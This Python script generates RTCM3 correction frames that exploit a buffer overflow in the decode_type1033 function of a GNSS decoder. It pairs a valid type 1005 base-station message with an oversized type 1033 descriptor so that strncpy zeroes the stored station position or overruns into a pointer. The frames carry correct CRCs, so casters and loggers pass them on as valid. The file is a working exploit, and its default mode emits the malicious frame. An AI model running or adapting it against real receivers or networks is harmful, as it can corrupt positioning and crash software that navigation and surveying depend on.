#!/usr/bin/env python3
"""
RTCM3 frame generator for the decode_type1033 station-position attack.

Emits two frames:
  1. a legitimate type 1005 (stationary RTK reference station ARP) that sets
     a realistic base-station position, and
  2. a type 1033 (receiver/antenna descriptor) whose `rectype` length field is
     large enough that the strncpy in decode_type1033 zero-pads straight
     through sta.pos[3].

Both frames are well-formed: correct length field, correct CRC24Q. Nothing
here is malformed at the RTCM layer -- a caster or logger will pass them
through as valid.

Usage:
    python gen_rtcm.py out.bin           # 1005 then malicious 1033
    python gen_rtcm.py out.bin --benign  # 1005 then harmless 1033
"""
import argparse
import struct

# Reference ECEF for the "legitimate" base station (metres).
BASE_ECEF = (-2694685.4730, -4293642.3660, 3857878.9240)


def crc24q(data: bytes) -> int:
    """RTCM3 CRC-24Q: poly 0x1864CFB, init 0."""
    crc = 0
    for b in data:
        crc ^= b << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


class BitWriter:
    def __init__(self):
        self.bits = []

    def u(self, value, n):
        for i in range(n - 1, -1, -1):
            self.bits.append((value >> i) & 1)
        return self

    def s(self, value, n):
        if value < 0:
            value += 1 << n
        return self.u(value, n)

    def bytes(self) -> bytes:
        assert len(self.bits) % 8 == 0, "payload must be byte-aligned"
        out = bytearray()
        for i in range(0, len(self.bits), 8):
            byte = 0
            for bit in self.bits[i:i + 8]:
                byte = (byte << 1) | bit
            out.append(byte)
        return bytes(out)


def frame(payload: bytes) -> bytes:
    """Wrap a payload in the RTCM3 transport frame (preamble, length, CRC24Q)."""
    assert len(payload) < 1024, "10-bit length field caps the payload at 1023"
    header = bytes([0xD3, (len(payload) >> 8) & 0x03, len(payload) & 0xFF])
    body = header + payload
    crc = crc24q(body)
    return body + bytes([(crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])


def msg1005(staid=1234, ecef=BASE_ECEF, itrf=0) -> bytes:
    """
    Type 1005 -- stationary RTK reference station ARP.

    Field order taken from decode_type1005() in src/rtcm3.c; the decoder
    requires exactly 19 payload bytes (it checks i+140 == rtcm->len*8).
    """
    w = BitWriter()
    w.u(1005, 12).u(staid, 12).u(itrf, 6).u(0, 4)
    w.s(round(ecef[0] * 10000), 38).u(0, 2)   # ECEF-X, 0.1 mm units
    w.s(round(ecef[1] * 10000), 38).u(0, 2)   # ECEF-Y
    w.s(round(ecef[2] * 10000), 38)           # ECEF-Z
    payload = w.bytes()
    assert len(payload) == 19, len(payload)
    return frame(payload)


def msg1033(staid=1234, antdes=b"", antsno=b"", rectype=b"", recver=b"",
            recsno=b"", setup=0) -> bytes:
    """
    Type 1033 -- receiver and antenna descriptors.

    Every descriptor is a length byte followed by that many characters. The
    decoder only *reads* the first 31 characters of each into its local
    staging buffer, but it passes the full declared length to strncpy -- which
    is the whole bug. So the frame must physically carry all the bytes it
    declares, even though bytes 31.. are never read.
    """
    payload = bytearray()
    payload += bytes([(1033 >> 4) & 0xFF,
                      ((1033 & 0x0F) << 4) | ((staid >> 8) & 0x0F),
                      staid & 0xFF])
    payload += bytes([len(antdes)]) + antdes
    payload += bytes([setup])
    payload += bytes([len(antsno)]) + antsno
    payload += bytes([len(rectype)]) + rectype
    payload += bytes([len(recver)]) + recver
    payload += bytes([len(recsno)]) + recsno
    expected = 9 + len(antdes) + len(antsno) + len(rectype) + len(recver) + len(recsno)
    assert len(payload) == expected, (len(payload), expected)
    return frame(bytes(payload))


def msg1007(staid=1234, antdes=b"", setup=0) -> bytes:
    """
    Type 1007 -- antenna descriptor only.

    Field order from decode_type1007() in src/rtcm3.c: message number(12) +
    staid(12) [3 bytes], antdes length n(8) [1 byte], antdes(n bytes),
    setup(8) [1 byte]. Same "only the first 31 bytes are read, but the wire
    must carry the full declared length" rule as 1033's descriptors.
    """
    w = BitWriter()
    w.u(1007, 12).u(staid, 12)
    payload = bytearray(w.bytes())
    payload += bytes([len(antdes)]) + antdes
    payload += bytes([setup])
    return frame(bytes(payload))


def msg1008(staid=1234, antdes=b"", antsno=b"", setup=0) -> bytes:
    """
    Type 1008 -- antenna descriptor and serial number.

    Field order from decode_type1008(): message number+staid [3 bytes],
    antdes length n(8), antdes(n bytes), setup(8), antsno length m(8),
    antsno(m bytes).
    """
    w = BitWriter()
    w.u(1008, 12).u(staid, 12)
    payload = bytearray(w.bytes())
    payload += bytes([len(antdes)]) + antdes
    payload += bytes([setup])
    payload += bytes([len(antsno)]) + antsno
    return frame(bytes(payload))


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("out", help="output file for the raw RTCM3 byte stream")
    ap.add_argument("--benign", action="store_true",
                    help="emit a normal 1033 instead of the oversized one")
    ap.add_argument("--field", choices=["rectype", "recsno"], default="rectype",
                    help="which descriptor to oversize. rectype stays inside "
                         "sta_t and silently zeroes sta.pos; recsno runs past "
                         "the end of sta_t into the dgps pointer (default rectype)")
    ap.add_argument("--len", type=int, default=255,
                    help="declared length of that descriptor (default 255)")
    args = ap.parse_args()

    stream = bytearray()
    stream += msg1005()

    if args.benign:
        stream += msg1033(antdes=b"TRM59800.00", rectype=b"TRIMBLE NETR9",
                          recver=b"5.22", recsno=b"5429R")
    else:
        # First 31 bytes are the only ones the decoder actually reads into its
        # staging buffer; the rest exist purely to satisfy the length check.
        blob = b"A" * 31 + b"\xff" * (args.len - 31)
        stream += msg1033(antdes=b"TRM59800.00", **{args.field: blob})

    with open(args.out, "wb") as fh:
        fh.write(stream)
    print(f"wrote {len(stream)} bytes to {args.out}")


if __name__ == "__main__":
    main()
